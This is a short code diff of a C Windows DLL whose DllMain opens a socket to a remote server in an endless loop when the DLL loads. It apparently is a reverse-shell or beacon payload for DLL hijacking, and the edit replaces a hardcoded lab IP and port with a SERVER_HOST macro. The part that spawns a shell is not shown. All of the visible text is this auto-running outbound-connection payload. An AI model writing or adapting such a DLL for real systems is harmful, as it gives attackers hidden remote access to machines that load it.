@@ -2,9 +2,6 @@
 #include <windows.h>
 #include <winsock2.h>
 
-#define SERVER_IP "192.168.45.209"
-#define SERVER_PORT 4242
-
 BOOL APIENTRY DllMain(HANDLE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
 {
     switch ( ul_reason_for_call )
@@ -16,7 +13,7 @@ BOOL APIENTRY DllMain(HANDLE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
             struct sockaddr_in hints;
             hints.sin_family = AF_INET,
             hints.sin_port = htons(SERVER_PORT),
-            hints.sin_addr.s_addr = inet_addr(SERVER_IP);
+            hints.sin_addr.s_addr = inet_addr(SERVER_HOST);
 
             while (1) {
                 SOCKET sock; 
